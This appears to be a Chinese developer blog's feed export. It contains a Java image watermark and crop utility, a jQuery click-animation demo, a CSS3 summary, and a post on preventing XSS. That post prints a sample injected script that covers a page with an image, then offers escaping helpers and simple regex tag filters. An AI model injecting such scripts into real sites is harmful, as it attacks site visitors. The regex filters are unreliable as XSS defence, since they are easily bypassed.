    <content type="text"><![CDATA[分享一个图片工具类，图片切割，图片水印，。。。。。直接上代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531package com.lrs.util;import java.awt.AlphaComposite;import java.awt.Color;import java.awt.Font;import java.awt.Graphics;import java.awt.Graphics2D;import java.awt.Image;import java.awt.Rectangle;import java.awt.RenderingHints;import java.awt.Toolkit;import java.awt.image.BufferedImage;import java.awt.image.CropImageFilter;import java.awt.image.FilteredImageSource;import java.awt.image.ImageFilter;import java.io.File;import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.FileOutputStream;import java.io.IOException;import java.io.InputStream;import java.io.OutputStream;import java.util.ArrayList;import java.util.Iterator;import java.util.List;import java.util.regex.Matcher;import java.util.regex.Pattern;import javax.imageio.ImageIO;import javax.imageio.ImageReadParam;import javax.imageio.ImageReader;import javax.imageio.stream.ImageInputStream;import javax.swing.ImageIcon;import com.sun.image.codec.jpeg.JPEGCodec;import com.sun.image.codec.jpeg.JPEGImageEncoder;/** * * @author tyro * */@SuppressWarnings(&quot;restriction&quot;)public class ImageUtils &#123; /** */ /** * 把图片印刷到图片上 * * @param pressImg * -- 水印文件 * @param targetImg * -- 目标文件 * @param drection * --水印位置， &lt;0.5 -- 左上角， =0.5 -- 中间 &gt;0.5 -- 右下角 * @param alpha * --透明度 */ public final static void pressImage(String pressImg, String targetImg, float drection, float alpha) &#123; try &#123; // 目标文件 float Alpha = alpha; File _file = new File(targetImg); Image src = ImageIO.read(_file); int wideth = src.getWidth(null); int height = src.getHeight(null); BufferedImage image = new BufferedImage(wideth, height, BufferedImage.TYPE_INT_RGB); Graphics2D g = image.createGraphics(); g.drawImage(src, 0, 0, wideth, height, null); // 水印文件 File _filebiao = new File(pressImg); Image src_biao = ImageIO.read(_filebiao); int wideth_biao = src_biao.getWidth(null); int height_biao = src_biao.getHeight(null); g.setComposite(AlphaComposite.getInstance(AlphaComposite.SRC_ATOP, Alpha)); if (drection &lt; 0.5) &#123; g.drawImage(src_biao, 50, 50, wideth_biao, height_biao, null); &#125; else if (drection == 0.5) &#123; g.drawImage(src_biao, wideth / 2, height / 2, null); &#125; else &#123; g.drawImage(src_biao, wideth - wideth_biao - 50, height - height_biao - 50, null); &#125; // 水印文件结束 g.dispose(); FileOutputStream out = new FileOutputStream(targetImg); JPEGImageEncoder encoder = JPEGCodec.createJPEGEncoder(out); encoder.encode(image); out.close(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; /** * 图片水印，保留原图生成新的图片水印 * * @param pressImg * @param targetImg * @param newPath * @param drection * @param alpha */ public final static void pressImage(String pressImg, String targetImg, String newPath, float drection, float alpha) &#123; try &#123; OutputStream os = null; // 目标文件 float Alpha = alpha; File _file = new File(targetImg); Image src = ImageIO.read(_file); int wideth = src.getWidth(null); int height = src.getHeight(null); BufferedImage image = new BufferedImage(wideth, height, BufferedImage.TYPE_INT_RGB); Graphics2D g = image.createGraphics(); g.drawImage(src, 0, 0, wideth, height, null); // 水印文件 File _filebiao = new File(pressImg); Image src_biao = ImageIO.read(_filebiao); int wideth_biao = src_biao.getWidth(null); int height_biao = src_biao.getHeight(null); g.setComposite(AlphaComposite.getInstance(AlphaComposite.SRC_ATOP, Alpha)); if (drection &lt; 0.5) &#123; g.drawImage(src_biao, 50, 50, wideth_biao, height_biao, null); &#125; else if (drection == 0.5) &#123; g.drawImage(src_biao, wideth / 2, height / 2, null); &#125; else &#123; g.drawImage(src_biao, wideth - wideth_biao - 50, height - height_biao - 50, null); &#125; // 水印文件结束 g.dispose(); os = new FileOutputStream(newPath); // 生成图片 ImageIO.write(image, &quot;JPG&quot;, os); os.close(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; /** */ /** * 打印文字水印图片 * * @param pressText * --文字 * @param targetImg * -- 目标图片 * @param fontName * -- 字体名 * @param fontStyle * -- 字体样式 * @param color * -- 字体颜色 * @param fontSize * -- 字体大小 * @param x * -- 偏移量 * @param y */ public static void pressText(String pressText, String targetImg, String fontName, int fontStyle, Color color, int fontSize, float drection, float alpha) &#123; try &#123; System.out.println(pressText.length()); float Alpha = alpha; File _file = new File(targetImg); Image src = ImageIO.read(_file); int wideth = src.getWidth(null); int height = src.getHeight(null); BufferedImage image = new BufferedImage(wideth, height, BufferedImage.TYPE_INT_RGB); Graphics2D g = image.createGraphics(); g.drawImage(src, 0, 0, wideth, height, null); g.setColor(color); g.setFont(new Font(fontName, fontStyle, fontSize)); g.setComposite(AlphaComposite.getInstance(AlphaComposite.SRC_ATOP, Alpha)); if (drection &lt; 0.5) &#123; g.drawString(pressText, fontSize, fontSize); &#125; else if (drection == 0.5) &#123; g.drawString(pressText, wideth / 2, height / 2); &#125; else &#123; // (中文)和 (文字的大小)是1:1的关系，字符是2:1的关系 g.drawString(pressText, wideth - (getTextLength(pressText) * fontSize) - fontSize, height - fontSize); &#125; g.dispose(); FileOutputStream out = new FileOutputStream(targetImg); JPEGImageEncoder encoder = JPEGCodec.createJPEGEncoder(out); encoder.encode(image); out.close(); &#125; catch (Exception e) &#123; System.out.println(e); &#125; &#125; /** * 给图片添加图片水印、可设置水印的旋转角度 * * @param filePath * 原图片地址 * @param newPath * 新图片地址 * @param logoPath * 水印图片地址 * @param degree * 旋转的度数(-180到180的整数) * @param alpha * 透明度：alpha 必须是范围 [0.0, 1.0] 之内（包含边界值）的一个浮点数字 */ public static void rotateImage(String filePath, String newPath, String logoPath, int degree, String alpha) &#123; OutputStream os = null; try &#123; if (!&quot;&quot;.equals(filePath)) &#123; Image srcImg = ImageIO.read(new File(filePath)); BufferedImage buffImg = new BufferedImage(srcImg.getWidth(null), srcImg.getHeight(null), BufferedImage.TYPE_INT_RGB); // 得到画笔对象 Graphics2D g = buffImg.createGraphics(); // 设置对线段锯齿状边缘处理 g.setRenderingHint(RenderingHints.KEY_INTERPOLATION, RenderingHints.VALUE_INTERPOLATION_BILINEAR); g.drawImage(srcImg.getScaledInstance(srcImg.getWidth(null), srcImg.getHeight(null), Image.SCALE_SMOOTH), 0, 0, null); // 设置水印图片旋转 g.rotate(Math.toRadians(degree), 0, 0); // 水印图片的路径，水印一般格式是gif，png,这种图片可以设置透明度 ImageIcon imgIcon = new ImageIcon(logoPath); // 得到Image对象 Image img = imgIcon.getImage(); // 原图片的宽高 int width = srcImg.getWidth(null); int height = srcImg.getHeight(null); // 水印图片的宽高 int width1 = img.getWidth(null); int height1 = img.getHeight(null); // 透明度 if (alpha == null || alpha.equals(&quot;&quot;)) &#123; alpha = &quot;1&quot;; &#125; g.setComposite(AlphaComposite.getInstance(AlphaComposite.SRC_ATOP, Float.parseFloat(alpha))); int x = -width / 2; int y = -height / 2; while (x &lt; width * 2) &#123; y = -height / 2; while (y &lt; height * 1.5) &#123; g.drawImage(img, x, y, null); y += height1 + 300; &#125; x += width1 + 300; &#125; // 表示水印图片的位置 // g.drawImage(img, (width - width1) / 2, (height - height1) / // 2, width1, height1, null); g.dispose(); os = new FileOutputStream(newPath); // 生成图片 ImageIO.write(buffImg, &quot;JPG&quot;, os); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; finally &#123; try &#123; if (null != os) &#123; os.close(); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; &#125; /** * 获取文本长度 * * @param text * @return */ public static int getTextLength(String text) &#123; int length = text.length(); for (int i = 0; i &lt; text.length(); i++) &#123; String s = String.valueOf(text.charAt(i)); if (s.getBytes().length &gt; 1) &#123; length++; &#125; &#125; length = length % 2 == 0 ? length / 2 : length / 2 + 1;// 是以中文的长度为标准获取 return length; &#125; /** * 从HTML源码中提取图片路径，最后以一个 String 类型的 List 返回，如果不包含任何图片，则返回一个 size=0 的List * 需要注意的是，此方法只会提取以下格式的图片：.jpg|.bmp|.eps|.gif|.mif|.miff|.png|.tif|.tiff|.svg|.wmf|.jpe|.jpeg|.dib|.ico|.tga|.cut|.pic * * @param htmlCode * HTML源码 * @return &lt;img&gt;标签 src 属性指向的图片地址的List集合 * @author Carl He */ public static List&lt;String&gt; getImageSrc(String htmlCode) &#123; List&lt;String&gt; imageSrcList = new ArrayList&lt;String&gt;(); Pattern p = Pattern.compile( &quot;&lt;img\\b[^&gt;]*\\bsrc\\b\\s*=\\s*(&apos;|\&quot;)?([^&apos;\&quot;\n\r\f&gt;]+(\\.jpg|\\.bmp|\\.eps|\\.gif|\\.mif|\\.miff|\\.png|\\.tif|\\.tiff|\\.svg|\\.wmf|\\.jpe|\\.jpeg|\\.dib|\\.ico|\\.tga|\\.cut|\\.pic)\\b)[^&gt;]*&gt;&quot;, Pattern.CASE_INSENSITIVE); Matcher m = p.matcher(htmlCode); String quote = null; String src = null; while (m.find()) &#123; quote = m.group(1); src = (quote == null || quote.trim().length() == 0) ? m.group(2).split(&quot;\\s+&quot;)[0] : m.group(2); imageSrcList.add(src); &#125; return imageSrcList; &#125; /** * 图像切割(按指定起点坐标和宽高切割) * * @param srcImageFile * 源图像地址 * @param result * 切片后的图像地址 * @param x * 目标切片起点坐标X * @param y * 目标切片起点坐标Y * @param width * 目标切片宽度 * @param height * 目标切片高度 */ public final static void cut(String srcImageFile, String result, int x, int y, int width, int height) &#123; try &#123; // 读取源图像 BufferedImage bi = ImageIO.read(new File(srcImageFile)); int srcWidth = bi.getHeight(); // 源图宽度 int srcHeight = bi.getWidth(); // 源图高度 if (srcWidth &gt; 0 &amp;&amp; srcHeight &gt; 0) &#123; Image image = bi.getScaledInstance(srcWidth, srcHeight, Image.SCALE_DEFAULT); // 四个参数分别为图像起点坐标和宽高 // 即: CropImageFilter(int x,int y,int width,int height) ImageFilter cropFilter = new CropImageFilter(x, y, width, height); Image img = Toolkit.getDefaultToolkit() .createImage(new FilteredImageSource(image.getSource(), cropFilter)); BufferedImage tag = new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB); Graphics g = tag.getGraphics(); g.drawImage(img, 0, 0, width, height, null); // 绘制切割后的图 g.dispose(); // 输出为文件 ImageIO.write(tag, &quot;png&quot;, new File(result)); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public final static void cut(InputStream in, String result, int x, int y, int width, int height) &#123; try &#123; // 读取源图像 BufferedImage bi = ImageIO.read(in); int srcWidth = bi.getHeight(); // 源图宽度 int srcHeight = bi.getWidth(); // 源图高度 if (srcWidth &gt; 0 &amp;&amp; srcHeight &gt; 0) &#123; Image image = bi.getScaledInstance(srcWidth, srcHeight, Image.SCALE_DEFAULT); // 四个参数分别为图像起点坐标和宽高 // 即: CropImageFilter(int x,int y,int width,int height) ImageFilter cropFilter = new CropImageFilter(x, y, width, height); Image img = Toolkit.getDefaultToolkit() .createImage(new FilteredImageSource(image.getSource(), cropFilter)); BufferedImage tag = new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB); Graphics g = tag.getGraphics(); g.drawImage(img, 0, 0, width, height, null); // 绘制切割后的图 g.dispose(); // 输出为文件 ImageIO.write(tag, &quot;png&quot;, new File(result)); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; /** * 图片裁切 * * @param x1 * 选择区域左上角的x坐标 * @param y1 * 选择区域左上角的y坐标 * @param width * 选择区域的宽度 * @param height * 选择区域的高度 * @param sourcePath * 源图片路径 * @param descpath * 裁切后图片的保存路径 */ public static void cut(int x1, int y1, int width, int height, String sourcePath, String descpath) &#123; FileInputStream is = null; ImageInputStream iis = null; try &#123; is = new FileInputStream(sourcePath); String fileSuffix = sourcePath.substring(sourcePath.lastIndexOf(&quot;.&quot;) + 1); Iterator&lt;ImageReader&gt; it = ImageIO.getImageReadersByFormatName(fileSuffix); ImageReader reader = it.next(); iis = ImageIO.createImageInputStream(is); reader.setInput(iis, true); ImageReadParam param = reader.getDefaultReadParam(); Rectangle rect = new Rectangle(x1, y1, width, height); param.setSourceRegion(rect); BufferedImage bi = reader.read(0, param); ImageIO.write(bi, fileSuffix, new File(descpath)); &#125; catch (Exception ex) &#123; ex.printStackTrace(); &#125; finally &#123; if (is != null) &#123; try &#123; is.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; is = null; &#125; if (iis != null) &#123; try &#123; iis.close(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; iis = null; &#125; &#125; &#125; public static void crop(InputStream input, OutputStream output, int x, int y, int w, int h, boolean isPNG) throws Exception &#123; try &#123; BufferedImage srcImg = ImageIO.read(input); int tmpWidth = srcImg.getWidth(); int tmpHeight = srcImg.getHeight(); int xx = Math.min(tmpWidth - 1, x); int yy = Math.min(tmpHeight - 1, y); int ww = w; if (xx + w &gt; tmpWidth) &#123; ww = Math.max(1, tmpWidth - xx); &#125; int hh = h; if (yy + h &gt; tmpHeight) &#123; hh = Math.max(1, tmpHeight - yy); &#125; BufferedImage dest = srcImg.getSubimage(xx, yy, ww, hh); BufferedImage tag = new BufferedImage(w, h, isPNG ? BufferedImage.TYPE_INT_ARGB : BufferedImage.TYPE_INT_RGB); tag.getGraphics().drawImage(dest, 0, 0, null); ImageIO.write(tag, isPNG ? &quot;png&quot; : &quot;jpg&quot;, output); &#125; catch (Exception e) &#123; e.printStackTrace(); throw new Exception(e); &#125; finally &#123; if (input != null) &#123; input.close(); &#125; if (output != null) &#123; output.close(); &#125; &#125; &#125; public static void crop(InputStream input, String result, int x, int y, int w, int h, boolean isPNG) throws Exception &#123; try &#123; BufferedImage srcImg = ImageIO.read(input); int tmpWidth = srcImg.getWidth(); int tmpHeight = srcImg.getHeight(); int xx = Math.min(tmpWidth - 1, x); int yy = Math.min(tmpHeight - 1, y); int ww = w; if (xx + w &gt; tmpWidth) &#123; ww = Math.max(1, tmpWidth - xx); &#125; int hh = h; if (yy + h &gt; tmpHeight) &#123; hh = Math.max(1, tmpHeight - yy); &#125; BufferedImage dest = srcImg.getSubimage(xx, yy, ww, hh); BufferedImage tag = new BufferedImage(w, h, isPNG ? BufferedImage.TYPE_INT_ARGB : BufferedImage.TYPE_INT_RGB); tag.getGraphics().drawImage(dest, 0, 0, null); ImageIO.write(tag, isPNG ? &quot;png&quot; : &quot;jpg&quot;, new FileOutputStream(new File(result))); &#125; catch (Exception e) &#123; e.printStackTrace(); throw new Exception(e); &#125; finally &#123; if (input != null) &#123; input.close(); &#125; &#125; &#125; public static void main(String[] args) throws FileNotFoundException, Exception &#123; // pressImage(&quot;E:\\watermark.png&quot;, &quot;E:\\test1.jpg&quot;, 1f, 0.5f); // pressImage(&quot;E:\\watermark.png&quot;, &quot;E:\\test.jpg&quot;, &quot;E:\\test1.jpg&quot;, 1f, // 0.5f); // pressText(&quot;www.tyro.com&quot;, &quot;E:\\test1.jpg&quot;, &quot;隶书&quot;, 36, Color.white, 36, // 0.5f, 0.5f); // rotateImage(&quot;E:\\test.jpg&quot;, &quot;E:\\test2.jpg&quot;, &quot;E:\\watermark.png&quot;, 30, // &quot;0.5&quot;); System.out.print(&quot;添加成功&quot;); // cut(148, 14, 251, 200, &quot;E:\\lrs_img\\timg1.jpg&quot;, // &quot;E:\\lrs_img\\timg11.png&quot;); crop(new FileInputStream(&quot;E:\\lrs_img\\timg1.jpg&quot;), &quot;E:\\lrs_img\\timg121.png&quot;, 148, 14, 251, 251, true); &#125;&#125; 拿走自己调试，如果可以，就点个赞呗！！！]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[点赞动画,鼠标点击动画]]></title>
    <url>%2Fblog%2F2017%2F10%2F14%2F%E7%82%B9%E8%B5%9E%E5%8A%A8%E7%94%BB%2C%E9%BC%A0%E6%A0%87%E7%82%B9%E5%87%BB%E5%8A%A8%E7%94%BB%2F</url>
    <content type="text"><![CDATA[点赞+1 动画、鼠标点击动画原理很简单通过绝对定位 和 样式动画就可以实现了。不多说了，看下面demo123456789101112131415161718192021222324252627282930313233343536373839&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot; /&gt;&lt;script src=&quot;http://libs.baidu.com/jquery/1.7.2/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;style&gt; h1,h2&#123; width:200px; height:30px; text-align:center; margin:200px auto; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;点击屏幕看看&lt;/h1&gt; &lt;h2&gt;&lt;a href=&quot;http://share.lrshuai.top/demo2.html&quot;&gt;滚动条:&lt;/a&gt;&lt;/h2&gt;&lt;script&gt;$(document).ready(function()&#123; //鼠标点击动画 $(&apos;body&apos;).click(function(e) &#123; e = e || window.event; xponit = e.pageX || e.clientX + document.body.scroolLeft; yponit = e.pageY || e.clientY + document.body.scrollTop; console.log(&quot;xponit&quot;,xponit); console.log(&quot;yponit&quot;,yponit); var elment = &quot;&lt;div class=&apos;pointanim&apos; style=&apos;position:absolute;top:&quot;+yponit+&quot;px;left:&quot;+xponit+&quot;px;color:red;text-align:center;font-size:2em;&apos;&gt;+1&lt;/div&gt;&quot;; $(this).append(elment); $(&quot;.pointanim&quot;).animate(&#123;opacity:&apos;0.5&apos;,top:&apos;0&apos;&#125;,1000,remove) &#125;); //回调函数 function remove()&#123; $(&quot;.pointanim&quot;).remove(); &#125; &#125;)&lt;/script&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>CSS</tag>
        <tag>JavaScript</tag>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于HTML 代码注入，XSS攻击问题解决]]></title>
    <url>%2Fblog%2F2017%2F10%2F13%2F%E5%85%B3%E4%BA%8EHTML%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%EF%BC%8CXSS%E6%94%BB%E5%87%BB%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%2F</url>
    <content type="text"><![CDATA[大部分的网站一般都有评论功能或留言功能，或类似可以让用户写东西的地方。如果后台不经过处理，又把数据返回前端，这就会出问题了。网页解析器会把用户的信息也当成html代码给解析了。如果用户写的是一些恶意的 js 脚本这是很危险的。专业术语叫：XSS 攻击一、举个例子：假设后台和前台都没有对用户的信息，进行处理。我们输入如下的代码：1234567&lt;script&gt; var body= document.body; var img = document.createElement(&quot;img&quot;); img.setAttribute(&apos;style&apos;,&apos;width:100%;height:100%;z-index:99999;position:fixed;top:0px;&apos;) img.src = &quot;https://www.baidu.com/img/bd_logo1.png&quot;; body.appendChild(img); &lt;/script&gt; 整个页面被整个图片覆盖掉如果是其他的恶意攻击，是可以入侵到你的服务器然后获取到shell 。二、解决方法：1、前端过滤(a)、javascript 原生方法123456789101112//转义 元素的innerHTML内容即为转义后的字符 function htmlEncode ( str ) &#123; var ele = document.createElement(&apos;span&apos;); ele.appendChild( document.createTextNode( str ) ); return ele.innerHTML; &#125; //解析 function htmlDecode ( str ) &#123; var ele = document.createElement(&apos;span&apos;); ele.innerHTML = str; return ele.textContent; &#125; (b)、JQuery 方法1234567function htmlEncodeJQ ( str ) &#123; return $(&apos;&lt;span/&gt;&apos;).text( str ).html(); &#125; function htmlDecodeJQ ( str ) &#123; return $(&apos;&lt;span/&gt;&apos;).html( str ).text(); &#125; 调用方法123var msg1= htmlEncodeJQ(&apos;&lt;script&gt;alert(&apos;test&apos;);&lt;/script&gt;&apos;);var msg1= htmlEncode(&apos;&lt;script&gt;alert(&apos;test&apos;);&lt;/script&gt;&apos;);//结果变成：&amp;lt;script&amp;gt;alert(&apos;test&apos;);&amp;lt;/script&amp;gt; 2、后端过滤 我这里是JAVA 的，其他的另百度 (a)、java 一些框架自动工具类，比如：org.springframework.web.util.HtmlUtils12345678public static void main(String[] args) &#123; String content = &quot;&lt;script&gt;alert(&apos;test&apos;);&lt;/script&gt;&quot;; System.out.println(&quot;content=&quot;+content); content = HtmlUtils.htmlEscape(content); System.out.println(&quot;content=&quot;+content); content = HtmlUtils.htmlUnescape(content); System.out.println(&quot;content=&quot;+content);&#125; 但这样有个问题，就是它全部的html标签都不解析了。可能这不是你想要的，你想要的是一部分解析，一部分不解析。好看下面。(b)、自己用正则来完成你的需求 下面给你demo ,根据你自己的需求来改就好了。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586package top.lrshuai.blog.util;import java.util.regex.Matcher;import java.util.regex.Pattern;/** * * @author lrshuai * @since 2017-10-13 * @version 0.0.1 */public class HTMLUtils &#123;/** * 过滤所有HTML 标签 * @param htmlStr * @return */public static String filterHTMLTag(String htmlStr) &#123; //定义HTML标签的正则表达式 String reg_html=&quot;&lt;[^&gt;]+&gt;&quot;; Pattern pattern=Pattern.compile(reg_html,Pattern.CASE_INSENSITIVE); Matcher matcher=pattern.matcher(htmlStr); htmlStr=matcher.replaceAll(&quot;&quot;); //过滤html标签 return htmlStr;&#125;/** * 过滤标签，通过标签名 * @param htmlStr * @param tagName * @return */public static String filterTagByName(String htmlStr,String tagName) &#123; String reg_html=&quot;&lt;&quot;+tagName+&quot;[^&gt;]*?&gt;[\\s\\S]*?&lt;\\/&quot;+tagName+&quot;&gt;&quot;; Pattern pattern=Pattern.compile(reg_html,Pattern.CASE_INSENSITIVE); Matcher matcher=pattern.matcher(htmlStr); htmlStr=matcher.replaceAll(&quot;&quot;); //过滤html标签 return htmlStr;&#125;/** * 过滤标签上的 style 样式 * @param htmlStr * @return */public static String filterHTMLTagInStyle(String htmlStr) &#123; String reg_html=&quot;style=(&apos;|\&quot;)(.*?)(&apos;|\&quot;)&quot;; Pattern pattern=Pattern.compile(reg_html,Pattern.CASE_INSENSITIVE); Matcher matcher=pattern.matcher(htmlStr); htmlStr=matcher.replaceAll(&quot;&quot;); //过滤html标签 return htmlStr;&#125; /** * 替换表情 * @param htmlStr * @param tagName * @return */public static String replayFace(String htmlStr) &#123; String reg_html=&quot;\\[em_\\d&#123;1,&#125;\\]&quot;; Pattern pattern =Pattern.compile(reg_html,Pattern.CASE_INSENSITIVE); Matcher matcher=pattern.matcher(htmlStr); if(matcher.find()) &#123; matcher.reset(); while(matcher.find()) &#123; String num = matcher.group(0); String number=num.substring(num.lastIndexOf(&apos;_&apos;)+1, num.length()-1); htmlStr = htmlStr.replace(num, &quot;&lt;img src=&apos;/face/arclist/&quot;+number+&quot;.gif&apos; border=&apos;0&apos; /&gt;&quot;); &#125; &#125; return htmlStr;&#125; public static void main(String[] args) &#123; String html = &quot;&lt;script&gt;alert(&apos;test&apos;);&lt;/script&gt;&lt;img src=&apos;/face/arclist/5.gif&apos; border=&apos;0&apos; /&gt;&lt;div style=&apos;position:fixs;s&apos;&gt;&lt;/div&gt;&lt;style&gt;body&#123;color:#fff;&#125;&lt;/style&gt;&lt;Style&gt;body&#123;color:#fff;&#125;&lt;/Style&gt;&lt;STYLE&gt;body&#123;color:#fff;&#125;&lt;/STYLE&gt;&quot;; System.out.println(&quot;html=&quot;+html); html = HTMLUtils.filterTagByName(html, &quot;style&quot;); System.out.println(&quot;html=&quot;+html); html = HTMLUtils.filterTagByName(html, &quot;script&quot;); System.out.println(&quot;html=&quot;+html); html = HTMLUtils.filterHTMLTagInStyle(html); System.out.println(&quot;html=&quot;+html); &#125; &#125; 下班了，哪天有空再补充]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>CSS</tag>
        <tag>JavaScript</tag>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS3 新增特性总结]]></title>
    <url>%2Fblog%2F2017%2F10%2F11%2FCSS3%20%E6%96%B0%E5%A2%9E%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[CSS3 新特性一、transform1、平移效果：transform:translate(100px,200px)这一行代码表示x轴方向向右平移100像素，y轴方向向下平移200像素。如果只想在某一个轴上平移，那么另外一个设置为0即可，这样很方便，也容易记住，也可以使用单独提供的translateX或者translateY。如果只传入一个参数，则表示在x轴向右平移的距离2、缩放效果：transform:transtale(1.5,2.5)如果是1则是没有缩放比例，如果超过1就是放大，小于1就是缩小。两个参数分别代表x轴方向和y轴方向。如果只传入一个参数，则是x轴和y轴方向同时按传入的参数比例进行缩放。也可以使用单独提供的scaleX和scaleY3、旋转效果: transform:tranrotate(90deg)只需要一个参数，就是要旋转的角度。默认的情况下是以中心点为基准点，正角度是顺时针旋转，负角度是逆时针旋转4、倾斜效果： transform:skew(45deg,90deg)这个与平移相似，如果传入一个参数，只表示在x轴方向的倾斜。同样如果只需要设置一个方向的倾斜，另一个设置为0deg即可，不需要使用skewX和skewY 所有属于transform的效果可以写在一起，中间用空格分隔开 二、设置圆角：border-radius: 5px 4px 3px 2px; / 四个半径值分别是左上角、右上角、右下角和左下角，顺时针 /三、设置阴影：box-shadow: X轴偏移量 Y轴偏移量 [阴影模糊半径] [阴影扩展半径] [阴影颜色] [投影方式`;四、线性渐变背景:background-image:linear-gradient(to top,red,yellow); 第一个参数是指渐变的方向。to top:从下到上;to top left:右下角到左下角。球形渐变：radial-gradient（）,参数配置比较复杂，这里就先不介绍 五、单行文本溢出显示省略号：123text-overflow:ellipsis; /* ellipsis表示显示省略标记，clip表示剪切 */ overflow:hidden; white-space:nowrap; /* 强制文本在一行内显示 */ 六、过渡属性transitiontransition-property:指定过渡或动态模拟的css属性。transition-duration:指定完成过渡所需的时间。transition-timing-function:指定过渡的缓动函数,如下： 值 描述 linear 规定以相同速度开始至结束的过渡效果（等于 cubic-bezier(0,0,1,1)）。 ease 规定慢速开始，然后变快，然后慢速结束的过渡效果（cubic-bezier(0.25,0.1,0.25,1)）。 ease-in 规定以慢速开始的过渡效果（等于 cubic-bezier(0.42,0,1,1)）。 ease-out 规定以慢速结束的过渡效果（等于 cubic-bezier(0,0,0.58,1)）。 ease-in-out 规定以慢速开始和结束的过渡效果（等于 cubic-bezier(0.42,0,0.58,1)）。 cubic-bezier(n,n,n,n) 在 cubic-bezier 函数中定义自己的值。可能的值是 0 至 1 之间的数值。 七、动画 -webkit-keyframes1234567891011121314151617/*这里是使一个div 进行旋转动画*/#divId&#123; -webkit-animation:myRotate 3s infinite linear ;&#125;@-webkit-keyframes myRotate &#123; 0%&#123; -webkit-transform: rotate(0deg); &#125; 50%&#123; -webkit-transform: rotate(180deg); &#125; 100%&#123; -webkit-transform: rotate(360deg); &#125;&#125; 八、各个属性 demo 集合123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;title&gt;Demo&lt;/title&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot; /&gt;&lt;head&gt; &lt;style&gt; .demo&#123; -webkit-perspective: 800px; -webkit-perspective-origin: 50% 50%; overflow:hidden; &#125; .pageGroup&#123; position: relative; margin:0px auto; height:400px; width:400px; -webkit-transform-style:preserve-3d; &#125; .page&#123; height:360px; width:360px; padding:20px; background-color: black; color:white; font-weight:bold; font-size:360px; line-height:360px; text-align:center; position:absolute; &#125; #page1 &#123; -webkit-transform-origin:bottom; -webkit-transition:-webkit-transform 0.5s linear; -webkit-transform: rotateX(0deg); &#125; #page2,#page3 ,#page4 ,#page5 ,#page6 &#123; -webkit-transform-origin:bottom; -webkit-transition:-webkit-transform 0.5s linear; -webkit-transform: rotateX(90deg); &#125; #bookpage &#123; -webkit-transform-origin:left; -webkit-transition:-webkit-transform 0.5s linear; &#125; #bookpage2,#bookpage3 ,#bookpage4 ,#bookpage5 ,#bookpage6 &#123; -webkit-transform-origin:left; -webkit-transition:-webkit-transform 0.5s linear; -webkit-transform: rotateY(0deg); &#125; #op&#123; text-align:center; margin:40px auto; &#125; #mypic&#123; width:200px; height:200px; margin:20px auto; &#125; #mypic img&#123; height:100%; border-radius: 50%; &#125; #mypic img:hover&#123; transform:rotate(360deg) ; -ms-transform:rotate(360deg); /* IE 9 */ -moz-transform:rotate(360deg); /* Firefox */ -webkit-transform:rotate(360deg); /* Safari 和 Chrome */ -o-transform:rotate(360deg); -webkit-transition-duration: 3s; &#125; .widthDemo&#123; width:200px; height:100px; margin:40px 0px; background:#ccc; text-align:center; &#125; #demo1:hover&#123; width:1100px; transition:width 2s linear; &#125; #demo2:hover&#123; width:1100px; transition:width 2s ease; &#125; #demo3:hover&#123; width:1100px; transition:width 2s ease-in; &#125; #demo4:hover&#123; width:1100px; transition:width 2s ease-out; &#125; #colorDiv&#123; width:300px; height:300px; background:blue; margin:40px auto; &#125; 